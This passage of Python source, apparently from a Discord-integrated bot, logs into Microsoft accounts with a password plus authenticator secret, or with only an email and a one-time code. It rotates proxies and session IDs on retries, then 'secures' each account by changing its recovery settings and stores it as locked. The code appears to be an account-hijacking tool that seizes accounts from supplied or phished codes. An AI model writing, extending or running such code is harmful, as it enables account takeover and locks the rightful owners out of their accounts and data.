            finally:
                await close_http(sesja)

        case "msauth":
            # msauth = password + authenticator TOTP (cookie-based, no email OTP)
            # Reuses the authpwd flow — login_authenticator handles the TOTP step
            seller_password = (data.get("password") or "").strip()
            auth_secret = (data.get("auth_secret") or "").strip()
            if not seller_password or not auth_secret:
                return _failure_result(
                    email,
                    "Missing password or authenticator secret",
                    error="missing msauth fields",
                )

            try:
                async def _totp_login(s):
                    result = await login_authenticator(
                        sesja=s,
                        email=email,
                        data={"password": seller_password, "auth_secret": auth_secret},
                    )
                    if result is not True:
                        reason = result if isinstance(result, str) and result else "invalid credentials"
                        return _failure_result(
                            email,
                            reason if reason != "invalid" else "invalid credentials",
                            password=seller_password,
                            error=reason,
                        )
                    return True

                login_ok, sesja = await run_with_proxy_retry(
                    sesja,
                    _totp_login,
                    new_session=get_session,
                    attempts=4,
                    rotate_ssid_after=2,
                    label="msauth-login",
                    email=email,
                )
                if isinstance(login_ok, dict) and login_ok.get("failed"):
                    return login_ok

                account["microsoft"]["password"] = seller_password
                account["microsoft"]["auth_secret"] = auth_secret

                dsecured = await secure(
                    sesja=sesja,
                    recovery=True,
                    acct=account,
                    command=True,
                )
                if isinstance(dsecured, dict) and dsecured.get("failed"):
                    return dsecured

                with DBConnection() as database:
                    database.store_locked(account_id, dsecured)
                return await build_account_embeds(dsecured, final_time, account_id)
            except Exception as exc:
                logging.error("msauth secure failed for %s", email)
                if is_network_glitch(exc):
                    return _failure_result(
                        email,
                        "Network/proxy error during msauth secure. Retry.",
                        error=str(exc),
                    )
                raise
            finally:
                await close_http(sesja)

        case "otp":
            # otp = email + Microsoft OTP code (email-based login, no password)
            # Uses OtcLoginEligibleProofs — no cookies, no auth secret needed
            otp_code = (data.get("otp_code") or "").strip()
            if not otp_code:
                return _failure_result(
                    email,
                    "Missing OTP code",
                    error="missing otp code",
                )

            lock_reason = await get_account_lock_reason(email)
            if lock_reason:
                return _failure_result(
                    email,
                    f"Cannot secure: {lock_reason}",
                    error=lock_reason,
                )

            # Request OTC proof info via the email OTP flow
            try:
                async def _otp_login(s):
                    result = await login_otp(
                        sesja=s,
                        email=email,
                        data={"otp_code": otp_code},
                    )
                    if result is not True:
                        reason = result if isinstance(result, str) and result else "invalid otp"
                        return _failure_result(
                            email,
                            reason,
                            error=reason,
                        )
                    return True

                login_ok, sesja = await run_with_proxy_retry(
                    sesja,
                    _otp_login,
                    new_session=get_session,
                    attempts=3,
                    rotate_ssid_after=2,
                    label="otp-login",
                    email=email,
                )
                if isinstance(login_ok, dict) and login_ok.get("failed"):
                    return login_ok

                print("[~] - OTP login OK — securing account…")

                dsecured = await secure(
                    sesja=sesja,
                    recovery=True,
                    acct=account,
                    command=True,
                )
                if isinstance(dsecured, dict) and dsecured.get("failed"):
                    return dsecured

                with DBConnection() as database:
                    database.store_locked(account_id, dsecured)
                return await build_account_embeds(dsecured, final_time, account_id)
            except Exception as exc:
                logging.error("otp secure failed for %s", email)
                if is_network_glitch(exc):
                    return _failure_result(
                        email,
                        "Network/proxy error during OTP secure. Retry.",
                        error=str(exc),
                    )
                raise
            finally:
                await close_http(sesja)

    logging.error("recovery_secure unknown method=%s email=%s", method, email)
    return _failure_result(email, f"Unknown secure method: {method}")
